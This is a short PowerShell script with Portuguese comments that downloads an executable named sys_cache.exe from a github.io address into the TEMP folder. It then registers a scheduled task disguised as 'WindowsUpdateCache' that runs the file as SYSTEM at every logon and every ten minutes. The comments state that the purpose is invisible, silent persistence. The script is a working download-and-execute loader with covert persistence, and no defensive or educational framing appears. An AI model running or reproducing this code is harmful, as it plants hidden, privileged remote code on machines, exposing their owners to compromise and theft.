# Configurações
$folder = "$env:TEMP\sys_cache"
$exePath = "$folder\sys_cache.exe"
$url = "https://syslog992.github.io/sys-cache-update/sys_cache.exe"
$taskName = "WindowsUpdateCache"

# 1. Cria a pasta de forma forçada
if (!(Test-Path $folder)) {
    New-Item -ItemType Directory -Force -Path $folder
}

# 2. Baixa o executável (usando WebClient para maior compatibilidade)
try {
    (New-Object System.Net.WebClient).DownloadFile($url, $exePath)
} catch {
    exit
}

# 3. Cria a Tarefa Agendada para persistência invisível
# Executa ao fazer logon e repete a cada 10 minutos
$action = New-ScheduledTaskAction -Execute $exePath
$trigger1 = New-ScheduledTaskTrigger -AtLogOn
$trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10)

# Registra a tarefa silenciosamente
Register-ScheduledTask -Action $action -Trigger $trigger1, $trigger2 -TaskName $taskName -User "SYSTEM" -Force
